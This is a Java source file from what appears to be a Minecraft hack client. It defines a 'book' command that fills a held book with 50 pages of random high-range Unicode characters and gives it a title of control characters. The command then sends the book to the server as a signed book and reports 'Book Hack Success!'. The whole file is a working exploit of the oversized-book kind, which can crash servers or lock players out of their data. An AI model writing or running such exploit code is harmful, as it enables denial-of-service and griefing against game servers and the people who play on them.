package com.firework.client.Features.CommandsSystem.Commands.Client;

import com.firework.client.Features.CommandsSystem.Command;
import com.firework.client.Features.CommandsSystem.CommandManifest;
import com.firework.client.Implementations.Utill.Chat.MessageUtil;
import io.netty.buffer.Unpooled;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.Packet;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.CPacketCustomPayload;

import java.util.Random;
import java.util.stream.Collectors;
import java.util.stream.IntStream;

@CommandManifest(label = "book")
public class BookCommand extends Command {
    private static Minecraft mc = Minecraft.getMinecraft();

    @Override
    public void execute(String[] args) {
        ItemStack heldItem = BookCommand.mc.player.getHeldItemMainhand();
        if (heldItem.getItem() == Items.WRITABLE_BOOK) {
            int limit = 50;
            Random rand = new Random();
            IntStream characterGenerator = rand.ints(128, 1112063).map(i -> i < 55296 ? i : i + 2048);
            String joinedPages = characterGenerator.limit(10500L).mapToObj(i -> String.valueOf((char)i)).collect(Collectors.joining());
            NBTTagList pages = new NBTTagList();
            for (int page = 0; page < 50; ++page) {
                pages.appendTag((NBTBase)new NBTTagString(joinedPages.substring(page * 210, (page + 1) * 210)));
            }
            if (heldItem.hasTagCompound()) {
                heldItem.getTagCompound().setTag("pages", (NBTBase)pages);
            } else {
                heldItem.setTagInfo("pages", (NBTBase)pages);
            }
            StringBuilder stackName = new StringBuilder();
            for (int i2 = 0; i2 < 16; ++i2) {
                stackName.append("\u0014\f");
            }
            heldItem.setTagInfo("author", (NBTBase)new NBTTagString(BookCommand.mc.player.getName()));
            heldItem.setTagInfo("title", (NBTBase)new NBTTagString(stackName.toString()));
            PacketBuffer buf = new PacketBuffer(Unpooled.buffer());
            buf.writeItemStack(heldItem);
            BookCommand.mc.player.connection.sendPacket((Packet)new CPacketCustomPayload("MC|BSign", buf));
           MessageUtil.sendClientMessage("Book Hack Success!",false);
        } else {
            MessageUtil.sendError("You need to held book in mainhand!",-1117);
        }
    }
}
